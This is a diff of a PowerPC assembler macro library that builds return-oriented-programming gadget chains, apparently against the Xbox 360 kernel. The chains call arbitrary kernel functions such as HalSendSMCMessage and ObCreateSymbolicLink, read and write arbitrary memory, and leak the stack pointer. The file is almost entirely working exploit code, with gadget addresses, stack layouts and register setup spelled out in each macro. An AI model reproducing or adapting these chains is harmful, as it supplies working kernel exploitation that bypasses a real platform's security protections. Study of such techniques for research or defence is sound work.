@@ -29,9 +29,11 @@
 # void CALL_FUNC
 #
 ###########################################################
-.macro CALL_FUNC label, func, R3H=cf_r3_def, R3L=cf_r3_def, R4H=cf_r4_def, R4L=cf_r4_def, R5H=cf_r5_def, R5L=cf_r5_def, R6H=cf_r6_def, R6L=cf_r6_def, R7H=cf_r7_def, R7L=cf_r7_def
+.macro CALL_FUNC label, func, R3H=cf_r3_def, R3L=cf_r3_def, R4H=cf_r4_def, R4L=cf_r4_def, R5H=cf_r5_def, R5L=cf_r5_def, R6H=cf_r6_def, R6L=cf_r6_def, R7H=cf_r7_def, R7L=cf_r7_def, R8H=cf_r8_def, R8L=cf_r8_def
 
-        ###########################################################
+.ifdef RETAIL_BUILD
+	
+		###########################################################
         # Gadget N: prologue
         #
         #   addi    r1, r1, 0x60
@@ -41,86 +43,189 @@
         #   blr
         ###########################################################
         .fill   0x50, 1, 0x00
-        .long   0x31313131, 0x31313131      # r31
-        .long   __restgprlr_24              # lr
+        .long   0x00000000, __restgprlr_31		# r31 - function to call for call_func_preload gadget
+        .long   mr_r31_to_r11              		# lr
         .long   0x00000000
-        
+
+		###########################################################
+        # Gadget N: load r11 with call address
+        #
+        #   mr      r11, r31
+		#   mr      r3, r11
+		#   addi    r1, r1, 0x70
+		#   lwz     r12, -8(r1)
+		#   mtlr    r12
+		#   ld      r30, -0x18(r1)
+		#   ld      r31, -0x10(r1)
+		#   blr
         ###########################################################
+		.fill 	0x58, 1, 0x00
+		.long	0x30303030, 0x30303030		# r30
+		.long   0x31313131, 0x31313131		# r31
+        .long   __restgprlr_25              # lr
+        .long   0x00000000
+		
+		###########################################################
         # Gadget N: setup registers for function call
         #
-        #   addi    r1, r1, 0xA0
-        #   b       __restgprlr_24
+        #	addi	r1, r1, 0x90
+		#	b		__restgprlr_25
         ###########################################################
-        .fill   0x58, 1, 0x00
+		.fill 	0x50, 1, 0x00
 
-    # Note the space before the colon is required for this to assemble correctly.
-    \label :
-
-.ifdef RETAIL_BUILD
-    
-        .long   0x24242424, 0x24242424          # r24
-        .long   \R7H, \R7L                      # r25 - r7
-        .long   \R6H, \R6L                      # r26 - r6
-        .long   \R5H, \R5L                      # r27 - r5
-        .long   \R4H, \R4L                      # r28 - r4
-        .long   \R3H, \R3L                      # r29 - r3
-        .long   0x00000000, call_func_dispatch  # r30 - next gadget address
-        .long   0x00000000, \func               # r31 - function to call
-        .long   call_func_preload               # lr
-        .long   0x00000000
-        
-        ###########################################################
+	# Note the space before the colon is required for this to assemble correctly.
+	\label :
+	
+		.long	\R8H, \R8L						# r25 - r8
+		.long	\R7H, \R7L						# r26 - r7
+		.long	\R6H, \R6L						# r27 - r6
+		.long	\R5H, \R5L						# r28 - r5
+		.long	\R4H, \R4L						# r29 - r4
+		.long	0x30303030, 0x30303030			# r30
+		.long	\R3H, \R3L						# r31 - r3
+		.long	call_func_preload				# lr
+		.long	0x00000000
+		
+		###########################################################
         # Gadget N: preload argument registers for function call
         #
-        #   mr      r7, r25
-        #   mtctr   r30
-        #   mr      r6, r26
-        #   mr      r5, r27
-        #   mr      r4, r28
-        #   mr      r3, r29
-        #   bctrl
+        #	mr		r8, r25
+		#	mr		r7, r26
+		#	mr		r6, r27
+		#	mr		r5, r28
+		#	mr		r4, r29
+		#	mr		r3, r31
+		#	mtctr	r11
+		#	bctrl
         ###########################################################
-    
-.else
-
-        .long   \R7H, \R7L                      # r24 - r7
-        .long   \R6H, \R6L                      # r25 - r6
-        .long   \R5H, \R5L                      # r26 - r5
-        .long   \R4H, \R4L                      # r27 - r4
-        .long   \R3H, \R3L                      # r28 - r3
-        .long   0x00000000, call_func_dispatch  # r29 - next gadget address
-        .long   0x30303030, 0x30303030          # r30
-        .long   0x00000000, \func               # r31 - function to call
-        .long   call_func_preload               # lr
-        .long   0x00000000
-        
-        ###########################################################
-        # Gadget N: preload argument registers for function call
+		
+		###########################################################
+        # Gadget N:
         #
-        #   mr      r7, r24
-        #   mr      r6, r25
-        #   mr      r5, r26
-        #   mr      r4, r27
-        #   mr      r3, r28
-        #   mtctr   r29
-        #   bctrl
-        ###########################################################
-
-.endif
-        
-        ###########################################################
-        # Gadget N: dispatch function call
-        #
-        #   mtctr   r31
-        #   bctrl
         #   addi    r1, r1, 0x60
-        #   lwz     r12, -8(r1)
+        #   lwz     r12, -0x8(r1)
         #   mtlr    r12
         #   ld      r31, -0x10(r1)
         #   blr
         ###########################################################
-        
-            # This gadget doubles as the epilogue.
+        .fill   0x50, 1, 0x00
+		.long	0x00000000, \func		# r31 - address of function to call
+		.long	call_func_dispatch		# lr
+		.long	0x00000000
+	
+.else
+
+		###########################################################
+        # Gadget N: prologue
+        #
+        #   addi    r1, r1, 0x60
+        #   lwz     r12, -0x8(r1)
+        #   mtlr    r12
+        #   ld      r31, -0x10(r1)
+        #   blr
+        ###########################################################
+        .fill   0x50, 1, 0x00
+        .long   0x00000000, __restgprlr_31		# r31 - function to call for call_func_preload gadget
+        .long   mr_r31_to_r11              		# lr
+        .long   0x00000000
+
+		###########################################################
+        # Gadget N: load r11 with call address
+        #
+        #   mr      r11, r31
+		#   mr      r3, r11
+		#   addi    r1, r1, 0x70
+		#   lwz     r12, -8(r1)
+		#   mtlr    r12
+		#   ld      r30, -0x18(r1)
+		#   ld      r31, -0x10(r1)
+		#   blr
+        ###########################################################
+		.fill 	0x58, 1, 0x00
+		.long	0x30303030, 0x30303030		# r30
+		.long   0x31313131, 0x31313131		# r31
+        .long   __restgprlr_24              # lr
+        .long   0x00000000
+		
+		###########################################################
+        # Gadget N: setup registers for function call
+        #
+        #	addi	r1, r1, 0xA0
+		#	b		__restgprlr_24
+        ###########################################################
+		.fill 	0x58, 1, 0x00
+
+	# Note the space before the colon is required for this to assemble correctly.
+	\label :
+	
+		.long	\R8H, \R8L						# r24 - r8
+		.long	0x25252525, 0x25252525			# r25
+		.long	0x26262626, 0x26262626			# r26
+		.long	0x27272727, 0x27272727			# r27
+		.long	\R7H, \R7L						# r28 - r7
+		.long	\R6H, \R6L						# r29 - r6
+		.long	\R5H, \R5L						# r30 - r5
+		.long	\R4H, \R4L						# r31 - r4
+		.long	call_func_preload				# lr
+		.long	0x00000000
+		
+		###########################################################
+        # Gadget N: preload argument registers for function call
+        #
+        #	mr		r8, r24
+		#	mr		r7, r28
+		#	mr		r6, r29
+		#	mr		r5, r30
+		#	mr		r4, r31
+		#	addi	r3, r1, 0x50
+		#	mtctr	r11
+		#	bctrl
+        ###########################################################
+		
+		###########################################################
+        # Gadget N:
+        #
+        #   addi    r1, r1, 0x60
+        #   lwz     r12, -0x8(r1)
+        #   mtlr    r12
+        #   ld      r31, -0x10(r1)
+        #   blr
+        ###########################################################
+        .fill   0x50, 1, 0x00
+		.long	\R3H, \R3L				# r31 - r3
+		.long	mr_r31_to_r3			# lr
+		.long	0x00000000
+		
+		###########################################################
+        # Gadget N:
+        #
+        #   mr      r3, r31
+		#   addi    r1, r1, 0x70
+		#   lwz     r12, -8(r1)
+		#   mtlr    r12
+		#   ld      r31, -0x10(r1)
+		#   blr
+        ###########################################################
+		.fill 	0x60, 1, 0x00
+		.long	0x00000000, \func		# r31 - function to call
+		.long	call_func_dispatch		# lr
+		.long	0x00000000
+
+.endif
+		
+		###########################################################
+        # Gadget N: dispatch function call
+        #
+        #	mtctr	r31
+		#	bctrl
+		#	addi	r1, r1, 0x60
+		#	lwz		r12, -8(r1)
+		#	mtlr	r12
+		#	ld		r31, -0x10(r1)
+		#	blr
+        ###########################################################
+		
+			# This gadget doubles as the epilogue.
 
 .endm
 
@@ -145,8 +250,83 @@
         #   ld      r31, -0x10(r1)
         #   blr
         ###########################################################
+		.fill   0x50, 1, 0x00
+        .long   0x00000000, __restgprlr_31  # r31 - address of function to call below
+        .long   mr_r31_to_r11        		# lr
+        .long   0x00000000
+		
+		###########################################################
+        # Gadget N: 
+        #
+        #   mr      r11, r31
+		#   mr      r3, r11
+		#   addi    r1, r1, 0x70
+		#   lwz     r12, -8(r1)
+		#   mtlr    r12
+		#   ld      r30, -0x18(r1)
+		#   ld      r31, -0x10(r1)
+		#   blr
+        ###########################################################
+		
+.ifdef RETAIL_BUILD
+
+		.fill   0x58, 1, 0x00
+		.long	0x30303030, 0x30303030
+        .long   0x31313131, 0x31313131  	# r31
+        .long   __restgprlr_29        		# lr
+		.long   0x00000000
+		
+		###########################################################
+        # Gadget N:
+        #
+        #	addi  	r1, r1, 0x70
+		#	b 		__restgprlr_29
+        ###########################################################
+		.fill 	0x50, 1, 0x00
+		.long	0x00000000, \constant		# r29 - constant to add
+		.long	0x30303030, 0x30303030		# r30
+		.long   0x31313131, 0x31313131  	# r31
+		.long   call_func_preload_r4        # lr
+        .long   0x00000000
+
+		###########################################################
+        # Gadget N: setup r4 with the constant value
+        #
+        #	mr		r4, r29
+		#	mr		r3, r31
+		#	mtctr	r11
+		#	bctrl
+        ###########################################################
+
+.else
+		.fill   0x58, 1, 0x00
+		.long	0x30303030, 0x30303030
+        .long   0x00000000, \constant  		# r31 - constant to add
+        .long   call_func_preload_r4        # lr
+        .long   0x00000000
+		
+		###########################################################
+        # Gadget N: setup r4 with the constant value
+        #
+        #	mr		r4, r31
+		#	addi	r3, r1, 0x50
+		#	mtctr	r11
+		#	bctrl
+        ###########################################################
+		
+.endif
+		
+		###########################################################
+        # Gadget N: __restgprlr_31
+        #
+        #   addi    r1, r1, 0x60
+        #   lwz     r12, -0x8(r1)
+        #   mtlr    r12
+        #   ld      r31, -0x10(r1)
+        #   blr
+        ###########################################################
         .fill   0x50, 1, 0x00
-        .long   0x00000000, \addr - 8       # r31 - address value -8 for displacement in load-add-store gadget
+        .long   0x00000000, \addr - 0x2EE8  # r31 - address value -0x2EE8 for displacement in load-add-store gadget
         .long   mr_r31_to_r11               # lr
         .long   0x00000000
         
@@ -163,32 +343,33 @@
         #   blr
         ###########################################################
         .fill   0x58, 1, 0x00
-        .long   0x30303030, 0x30303030              # r30
-        .long   0x31313131, 0x31313131              # r31
-        .long   __restgprlr_31                      # lr
+        .long   0x30303030, 0x30303030              		# r30
+        .long   0x00000000, load_add_store_r3_r4_on_r11     # r31 - address of function to call
+        .long   call_func_dispatch                    		# lr
         .long   0x00000000
-        
-        ###########################################################
+		
+		###########################################################
         # Gadget N: call load add store gadget
         #
-        #   r5 = constant value to add
+		#	mtctr	r31
+		#	bctrl
+		#	addi	r1, r1, 0x60
+		#	lwz		r12, -8(r1)
+		#	mtlr	r12
+		#	ld		r31, -0x10(r1)
+		#	blr
+		###########################################################
+		
+			# This gadget doubles as the epilogue.
+		
+		###########################################################
+        # Gadget N:
         #
-        #   lwz     r10, 8(r11)
-        #   add     r10, r5, r10
-        #   stw     r10, 8(r11)
-        #   blr
-        ###########################################################
-        CALL_FUNC 111, load_add_store_r10_r5_on_r11, R5H=0, R5L=\constant
-        
-        ###########################################################
-        # Gadget N: epilogue to be implemented by the caller
-        #
-        #   addi    r1, r1, 0x60
-        #   lwz     r12, -0x8(r1)
-        #   mtlr    r12
-        #   ld      r31, -0x10(r1)
-        #   blr
-        ###########################################################
+		#	lwz		r3, 0x2EE8(r11)
+		#	add		r10, r3, r4
+		#	stw		r10, 0x2EE8(r11)
+		#	blr
+		###########################################################
 
 .endm
 
@@ -210,50 +391,102 @@
         #   blr
         ###########################################################
         .fill   0x50, 1, 0x00
-        .long   0x00000000, mr_r1_to_r3         # r31 - next gadget address
-        .long   call_func_dispatch              # lr
+        .long   0x00000000, __restgprlr_31     	# r31 - gadget address to branch to
+        .long   mr_r31_to_r3              		# lr
         .long   0x00000000
-        
-        ###########################################################
-        # Gadget N: call get stack pointer gadget
+		
+		###########################################################
+        # Move gadget address into r3
         #
-        #   mtctr   r31
-        #   bctrl
+        #   mr      r3, r31
+		#   addi    r1, r1, 0x70
+		#   lwz     r12, -8(r1)
+		#   mtlr    r12
+		#   ld      r31, -0x10(r1)
+		#   blr
+        ###########################################################
+		.fill 	0x60, 1, 0x00
+		.long	0x31313131, 0x31313131		# r31
+		.long	mr_r3_to_r10				# lr
+		.long	0x00000000
+		
+		###########################################################
+        # Move gadget address into r10
+        #
+        #	mr		r10, r3
+		#	mr		r3, r10
+		#	addi	r1, r1, 0x60
+		#	lwz		r12, -0x8(r1)
+		#	mtlr	r12
+		#	blr
+        ###########################################################
+		.fill 	0x58, 1, 0x00
+		.long	mr_r1_to_r4		# lr
+		.long	0x00000000
+		
+		###########################################################
+        # Move stack pointer into r4
+        #
+        #	mr		r4, r1
+		#	mtctr	r10
+		#	mtlr	r11
+		#	bctr
+        ###########################################################
+		
+		###########################################################
+        # Setup for next gadget
+        #
         #   addi    r1, r1, 0x60
-        #   lwz     r12, -8(r1)
-        #   mtlr    r12
-        #   ld      r31, -0x10(r1)
-        #   blr
+		#   lwz     r12, -0x8(r1)
+		#   mtlr    r12
+		#   ld      r31, -0x10(r1)
+		#   blr
         ###########################################################
-        .fill   0x50, 1, 0x00
-        .long   0x00000000, \scratch_addr       # r31 - address to store r3 at
-        .long   stw_r3                          # lr
-        .long   0x00000000
-        
-        ###########################################################
-        # Gadget N: get stack pointer into r3
+		.fill 	0x50, 1, 0x00
+		.long	0x00000000, \scratch_addr		# r31 - address to store stack pointer to
+		.long	mr_r31_to_r3					# lr
+		.long	0x00000000
+		
+		###########################################################
+        # Move scratch address into r3
         #
-        #   mr      r3, r1
-        #   blr
+        #   mr      r3, r31
+		#   addi    r1, r1, 0x70
+		#   lwz     r12, -8(r1)
+		#   mtlr    r12
+		#   ld      r31, -0x10(r1)
+		#   blr
         ###########################################################
-        
-        ###########################################################
-        # Gadget N: store stack pointer to scratch address
+		.fill 	0x60, 1, 0x00
+		.long	0x00000000, stw_r4_on_r3		# r31 - gadget address to call
+		.long	call_func_dispatch				# lr
+		.long	0x00000000
+		
+		###########################################################
+        # Call stw gadget
         #
-        #   stw     r3, 0(r31)
-        #   addi    r1, r1, 0x60
-        #   lwz     r12, -0x8(r1)
-        #   mtlr    r12
-        #   ld      r31, -0x10(r1)
-        #   blr
-        ###########################################################
+		#	mtctr	r31
+		#	bctrl
+		#	addi	r1, r1, 0x60
+		#	lwz		r12, -8(r1)
+		#	mtlr	r12
+		#	ld		r31, -0x10(r1)
+		#	blr
+		###########################################################
+		
+		###########################################################
+        # Store stack pointer to scratch address
+        #
+		#	stw		r4, 8(r3)
+		#	blr
+		###########################################################
         
         ###########################################################
         # Gadget N: offset stack pointer to point to next gadget after this macro
         #
         ###########################################################
 1:
-        LOAD_ADD_STORE \scratch_addr, 0x60 + (1f - 1b) + 0x60       # 0x60 for call_func_dispatch, 0x60 for epilogue
+        LOAD_ADD_STORE \scratch_addr, 0x60 + 0x70 + 0x60 + (1f - 1b) + 0x60     	# 0x60 for __restgprlr_31, 0x70 for mr_r31_to_r3, 0x60 for call_func_dispatch, 0x60 for epilogue
 1:
         
         ###########################################################
@@ -290,24 +523,60 @@
         #   ld      r31, -0x10(r1)
         #   blr
         ###########################################################
-        #.fill   0x50, 1, 0x00
-        #.long   0x31313131, 0x31313131      # r31
-        #.long   __restgprlr_31              # lr
-        #.long   0x00000000
-        
-        ###########################################################
-        # Gadget N: deref base_addr and write value to scratch_addr
+        .fill   0x50, 1, 0x00
+        .long   0x00000000, \base_addr - lwz_r3_off_r3_disp     # r31 - base_addr value
+        .long   mr_r31_to_r3              						# lr
+        .long   0x00000000
+		
+		###########################################################
+        # Gadget N: load base_addr into r3
         #
-        #   r3 = address to read value at
-        #   r4 = address to store value at
-        #
-        #   lwz     r11, 0(r3)
-        #   stw     r11, 8(r4)
-        #   li      r3, 0
-        #   blr
+		#   mr      r3, r31
+		#   addi    r1, r1, 0x70
+		#   lwz     r12, -8(r1)
+		#   mtlr    r12
+		#   ld      r31, -0x10(r1)
+		#   blr
         ###########################################################
-        CALL_FUNC 111, lwz_r3_stw_r4, R3H=0, R3L=\base_addr - lwz_r3_stw_r4__r3_disp, R4H=0, R4L=\scratch_addr - lwz_r3_stw_r4__r4_disp
-        
+		.fill 	0x60, 1, 0x00
+		.long	0x00000000, lwz_r3_off_r3		# r31 - address of function to call
+		.long	call_func_dispatch				# lr
+		.long	0x00000000
+		
+		###########################################################
+        # Gadget N: 
+        #
+		#	mtctr	r31
+		#	bctrl
+		#	addi	r1, r1, 0x60
+		#	lwz		r12, -8(r1)
+		#	mtlr	r12
+		#	ld		r31, -0x10(r1)
+		#	blr
+        ###########################################################
+		.fill 	0x50, 1, 0x00
+		.long	0x00000000, \scratch_addr		# r31 - scratch address to store base address value at
+		.long	stw_r3							# lr
+		.long	0x00000000
+		
+		###########################################################
+        # Gadget N: deref base_addr
+        #
+		#	lwz		r3, 0x24(r3)
+		#	blr
+        ###########################################################
+		
+		###########################################################
+        # Gadget N: write base_addr value into scratch_addr
+        #
+		#   stw     r3, 0(r31)
+		#   addi    r1, r1, 0x60
+		#   lwz     r12, -0x8(r1)
+		#   mtlr    r12
+		#   ld      r31, -0x10(r1)
+		#   blr
+        ###########################################################
+		
         ###########################################################
         # Gadget N: adjust base_addr by offset
         #
@@ -315,38 +584,106 @@
         LOAD_ADD_STORE \scratch_addr, \offset
         .fill   0x50, 1, 0x00
         .long   0x00000000, \ptr_val            # r31 - pointer to dereference
-        .long   lwz_r3                          # lr
+        .long   mr_r31_to_r3                    # lr
         .long   0x00000000
-        
-        ###########################################################
-        # Gadget N: dereference ptr_val into r3
+		
+		###########################################################
+        # Gadget N: move pointer into r3
         #
-        #   lwz     r3, 0(r31)
-        #   addi    r1, r1, 0x60
-        #   lwz     r12, var_8(r1)
-        #   mtlr    r12
-        #   ld      r31, var_10(r1)
-        #   blr
+		#   mr      r3, r31
+		#   addi    r1, r1, 0x70
+		#   lwz     r12, -8(r1)
+		#   mtlr    r12
+		#   ld      r31, -0x10(r1)
+		#   blr
         ###########################################################
-        .fill   0x50, 1, 0x00
-        .long   0x00000000, \scratch_addr - 4       # r31 - pointer to address to store r3 at
-        .long   stw_r3_onto_pointer                 # lr
+		.fill 	0x60, 1, 0x00
+		.long	0x00000000, lwz_r11_off_r3		# r31 - address of function to call
+		.long	call_func_dispatch				# lr
+		.long	0x00000000
+		
+		###########################################################
+        # Gadget N:
+        #
+		#	mtctr	r31
+		#	bctrl
+		#	addi	r1, r1, 0x60
+		#	lwz		r12, -8(r1)
+		#	mtlr	r12
+		#	ld		r31, -0x10(r1)
+		#	blr
+        ###########################################################
+		.fill 	0x50, 1, 0x00
+		.long	0x00000000, \scratch_addr - lwz_r3_off_r3_disp		# r31 - 
+		.long	mr_r31_to_r3
+		.long	0x00000000
+		
+		###########################################################
+        # Gadget N: dereference pointer into r11
+        #
+		#	lwz		r11, 0(r3)
+		#	extrwi	r3, r11, 1,10
+		#	blr
+        ###########################################################
+		
+		###########################################################
+        # Gadget N: move scratch pointer to destination address into r3
+        #
+		#   mr      r3, r31
+		#   addi    r1, r1, 0x70
+		#   lwz     r12, -8(r1)
+		#   mtlr    r12
+		#   ld      r31, -0x10(r1)
+		#   blr
+        ###########################################################
+		.fill 	0x60, 1, 0x00
+		.long	0x00000000, lwz_r3_off_r3			# r31 - address of function to call
+		.long	call_func_dispatch					# lr
+		.long	0x00000000
+		
+		###########################################################
+        # Gadget N:
+        #
+		#	mtctr	r31
+		#	bctrl
+		#	addi	r1, r1, 0x60
+		#	lwz		r12, -8(r1)
+		#	mtlr	r12
+		#	ld		r31, -0x10(r1)
+		#	blr
+        ###########################################################
+		.fill 	0x50, 1, 0x00
+        .long   0x00000000, stw_r11_on_r3      		# r31 - address of function to call
+        .long   call_func_dispatch                 	# lr
         .long   0x00000000
-        
-        ###########################################################
-        # Gadget N: store ptr into gadget data
+		
+		###########################################################
+        # Gadget N: read destination address from scratch
         #
-        #   lwz     r11, 4(r31)
-        #   stw     r3, 0(r11)
-        #   li      r3, 0
-        #   addi    r1, r1, 0x60
-        #   lwz     r12, -8(r1)
-        #   mtlr    r12
-        #   ld      r31, -0x10(r1)
-        #   blr
+		#	lwz		r3, 0x24(r3)
+		#	blr
         ###########################################################
-        
-            # This gadget also acts as the epilogue.
+		
+		###########################################################
+        # Gadget N:
+        #
+		#	mtctr	r31
+		#	bctrl
+		#	addi	r1, r1, 0x60
+		#	lwz		r12, -8(r1)
+		#	mtlr	r12
+		#	ld		r31, -0x10(r1)
+		#	blr
+        ###########################################################
+		
+			# This gadget also acts as the epilogue.
+		
+		###########################################################
+        # Gadget N: store pointer value to destination address
+        #
+		#	stw		r11, 0(r3)
+		#	blr
+        ###########################################################
 
 .endm
 
@@ -368,32 +705,112 @@
         #   blr
         ###########################################################
         .fill   0x50, 1, 0x00
-        .long   0x31313131, 0x31313131      # r31
-        .long   __restgprlr_31              # lr
+        .long   0x00000000, \ptr_val - lwz_r3_off_r3_disp 		# r31 - address to dereference
+        .long   mr_r31_to_r3              						# lr
         .long   0x00000000
-        
-        ###########################################################
-        # Gadget N: call lwz_r3_stw_r4 gadget
+		
+		###########################################################
+        # Move ptr_val into r3
         #
-        #   r3 = pointer to dereference (offset for gadget displacement)
-        #   r4 = address to write pointer value at (offset for gadget displacement)
+        #   mr      r3, r31
+		#   addi    r1, r1, 0x70
+		#   lwz     r12, -8(r1)
+		#   mtlr    r12
+		#   ld      r31, -0x10(r1)
+		#   blr
+        ###########################################################
+		.fill 	0x60, 1, 0x00
+		.long	0x00000000, lwz_r3_off_r3		# r31 - gadget address to call
+		.long	call_func_dispatch				# lr
+		.long	0x00000000
+		
+		###########################################################
+        # Call pointer dereference gadget
         #
-        #   lwz     r11, 0(r3)
-        #   stw     r11, 8(r4)
-        #   li      r3, 0
-        #   blr
+        #	mtctr	r31
+		#	bctrl
+		#	addi	r1, r1, 0x60
+		#	lwz		r12, -8(r1)
+		#	mtlr	r12
+		#	ld		r31, -0x10(r1)
+		#	blr
         ###########################################################
-        CALL_FUNC 111, lwz_r3_stw_r4, R3H=0, R3L=\ptr_val - lwz_r3_stw_r4__r3_disp, R4H=0, R4L=\addr - lwz_r3_stw_r4__r4_disp
-        
-        ###########################################################
-        # Gadget N: epilogue to be implemented by the caller
+		.fill 	0x50, 1, 0x00
+		.long	0x00000000, \addr		# r31 - address to store ptr_val at
+		.long	stw_r3					# lr
+		.long	0x00000000
+		 
+		###########################################################
+        # Dereference ptr_val into r3
         #
-        #   addi    r1, r1, 0x60
-        #   lwz     r12, -0x8(r1)
-        #   mtlr    r12
-        #   ld      r31, -0x10(r1)
-        #   blr
+        #	lwz		r3, 0x24(r3)
+		#	blr
         ###########################################################
+		
+		###########################################################
+        # Store ptr_val into addr
+        #
+        #   stw     r3, 0(r31)
+		#   addi    r1, r1, 0x60
+		#   lwz     r12, -0x8(r1)
+		#   mtlr    r12
+		#   ld      r31, -0x10(r1)
+		#   blr
+        ###########################################################
+		
+			# This gadget doubles as the epilogue.
+
+.endm
+
+###########################################################
+# void WRITE_CONSTANT_TO_ADDRESS(addr, const_val)
+#
+#   Writes const_val to the address addr.
+#
+###########################################################
+.macro WRITE_CONSTANT_TO_ADDRESS addr, const_val
+
+		###########################################################
+		# Gadget N: prologue
+		#
+		#	addi	r1, r1, 0x60
+		#	lwz		r12, -0x8(r1)
+		#	mtlr	r12
+		#	ld		r31, -0x10(r1)
+		#	blr
+		###########################################################
+		.fill	0x50, 1, 0x00
+		.long	0x00000000, \const_val		# r31
+        .long   mr_r31_to_r3            	# lr
+		.long	0x00000000
+		
+		###########################################################
+		# Load constant value into r3
+		#
+		# 	mr		r3, r31
+		#	addi	r1, r1, 0x70
+		#	lwz		r12, -8(r1)
+		#	mtlr	r12
+		#	ld		r31, -0x10(r1)
+		#	blr
+		###########################################################
+		.fill 	0x60, 1, 0x00
+		.long	0x00000000, \addr		# r31 - address to store constant at
+		.long	stw_r3					# lr
+		.long	0x00000000
+		
+		###########################################################
+		# Store constant value to address
+		#
+		#   stw     r3, 0(r31)
+		#   addi    r1, r1, 0x60
+		#   lwz     r12, -0x8(r1)
+		#   mtlr    r12
+		#   ld      r31, -0x10(r1)
+		#   blr
+		###########################################################
+		
+			# This gadget doubles as the epilogue.
 
 .endm
 
@@ -422,13 +839,78 @@
         ###########################################################
         # Gadget N: call DbgBreakPoint
         #
-        #   mtctr   r31
-        #   bctrl
+        #	mtctr	r31
+		#	bctrl
+		#	addi	r1, r1, 0x60
+		#	lwz		r12, -8(r1)
+		#	mtlr	r12
+		#	ld		r31, -0x10(r1)
+		#	blr
+        ###########################################################
+        .fill   0x50, 1, 0x00
+        .long   0x31313131, 0x31313131              # r31
+        .long   __restgprlr_31                      # lr
+        .long   0x00000000
+        
+        ###########################################################
+        # Gadget N: epilogue to be implemented by the caller
+        #
         #   addi    r1, r1, 0x60
-        #   lwz     r12, -8(r1)
+        #   lwz     r12, -0x8(r1)
         #   mtlr    r12
         #   ld      r31, -0x10(r1)
         #   blr
+        ###########################################################
+
+.endm
+
+###########################################################
+# void DBG_BREAK_WITH_STATUS(ULONG status)
+#
+#   Triggers a break point.
+#
+###########################################################
+.macro DBG_BREAK_WITH_STATUS status=0
+
+        ###########################################################
+        # Gadget N: prologue
+        #
+        #   addi    r1, r1, 0x60
+        #   lwz     r12, -0x8(r1)
+        #   mtlr    r12
+        #   ld      r31, -0x10(r1)
+        #   blr
+        ###########################################################
+		.fill   0x50, 1, 0x00
+        .long   0x00000000, \status     	# r31 - status value
+        .long   mr_r31_to_r3          		# lr
+        .long   0x00000000
+		
+		###########################################################
+        # Load r3 with the status value
+        #
+        #   mr      r3, r31
+		#   addi    r1, r1, 0x70
+		#   lwz     r12, -8(r1)
+		#   mtlr    r12
+		#   ld      r31, -0x10(r1)
+		#   blr
+        ###########################################################
+        .fill   0x60, 1, 0x00
+        .long   0x00000000, DbgBreakPoint           # r31 - function address
+        .long   call_func_dispatch                  # lr
+        .long   0x00000000
+        
+        ###########################################################
+        # Gadget N: call DbgBreakPoint
+        #
+        #	mtctr	r31
+		#	bctrl
+		#	addi	r1, r1, 0x60
+		#	lwz		r12, -8(r1)
+		#	mtlr	r12
+		#	ld		r31, -0x10(r1)
+		#	blr
         ###########################################################
         .fill   0x50, 1, 0x00
         .long   0x31313131, 0x31313131              # r31
@@ -468,14 +950,14 @@
         #.long   0x31313131, 0x31313131              # r31
         #.long   __restgprlr_31                      # lr
         #.long   0x00000000
-        
-        ###########################################################
+		
+		###########################################################
         # Gadget N: call ObCreateSymbolicLink and create the mapping
         #
-        #   r3 = pointer to mount path ANSI_STRING structure
-        #   r4 = pointer to device path ANSI_STRING structure
-        ###########################################################
-        CALL_FUNC 111, ObCreateSymbolicLink, R3H=0, R3L=\mount, R4H=0, R4L=\path
+		#	r3 = pointer to mount path ANSI_STRING structure
+		#	r4 = pointer to device path ANSI_STRING structure
+		###########################################################
+		CALL_FUNC 111, ObCreateSymbolicLink, R3H=0, R3L=\mount, R4H=0, R4L=\path
         
         ###########################################################
         # Gadget N: epilogue to be implemented by the caller
@@ -493,13 +975,13 @@
 .set LED_COLOR_RED_2,           0x02
 .set LED_COLOR_RED_3,           0x04
 .set LED_COLOR_RED_4,           0x08
-.set LED_COLOR_FULL_RED,        0x0F
+.set LED_COLOR_FULL_RED,		0x0F
 .set LED_COLOR_GREEN_1,         0x10
 .set LED_COLOR_GREEN_2,         0x20
 .set LED_COLOR_GREEN_3,         0x40
 .set LED_COLOR_GREEN_4,         0x80
-.set LED_COLOR_FULL_GREEN,      0xF0
-.set LED_COLOR_FULL_ORANGE,     0xFF
+.set LED_COLOR_FULL_GREEN,		0xF0
+.set LED_COLOR_FULL_ORANGE,		0xFF
 
 ###########################################################
 # void SET_LED(int color)
@@ -520,50 +1002,47 @@
         #   blr
         ###########################################################
         .fill   0x50, 1, 0x00
-        .long   0x31313131, 0x31313131              # r31
-        .long   __restgprlr_30                      # lr
+        .long   0x00000000, 0x99FF0000 | ((\color & 0xFF) << 8)     # r31 - color command value
+        .long   mr_r31_to_r3                      					# lr
         .long   0x00000000
-        
-        ###########################################################
+		
+		###########################################################
         # Gadget N: setup for led override command
         #
-        #   addi    r1, r1, 0x70
-        #   lwz     r12, -0x8(r1)
-        #   mtlr    r12
-        #   ld      r30, -0x18(r1)
-        #   ld      r31, -0x10(r1)
-        #   blr
+        # 	mr		r3, r31
+		#	addi	r1, r1, 0x70
+		#	lwz		r12, -8(r1)
+		#	mtlr	r12
+		#	ld		r31, -0x10(r1)
+		#	blr
         ###########################################################
-        .fill   0x58, 1, 0x00
-        .long   0x00000000, 0x99FF0000 | ((\color & 0xFF) << 8)     # r30 - color command value
-        .long   0x00000000, smc_command_buffer                      # r31 - address of command buffer
-        .long   stw_r30_on_r31                                      # lr
-        .long   0x00000000
+		.fill 	0x60, 1, 0x00
+		.long   0x00000000, smc_command_buffer                      # r31 - address of command buffer
+		.long	stw_r3												# lr
+		.long	0x00000000
         
         ###########################################################
         # Gadget N: write led color override command to smc command buffer
         #
-        #   stw     r30, 0(r31)
-        #   addi    r1, r1, 0x70
-        #   lwz     r12, -8(r1)
-        #   mtlr    r12
-        #   ld      r30, -0x18(r1)
-        #   ld      r31, -0x10(r1)
-        #   blr
+        #	stw		r3, 0(r31)
+		#	addi	r1, r1, 0x60
+		#	lwz		r12, -0x8(r1)
+		#	mtlr	r12
+		#	ld		r31, -0x10(r1)
+		#	blr
         ###########################################################
-        .fill   0x58, 1, 0x00
-        .long   0x30303030, 0x30303030              # r30
+        .fill 	0x50, 1, 0x00
         .long   0x31313131, 0x31313131              # r31
         .long   __restgprlr_31                      # lr
         .long   0x00000000
-        
-        ###########################################################
+		
+		###########################################################
         # Gadget N: call HalSendSMCMessage
         #
-        #   r3 = command buffer address
-        #   r4 = response = false
-        ###########################################################
-        CALL_FUNC 111, HalSendSMCMessage, R3H=0, R3L=smc_command_buffer, R4H=0, R4L=0
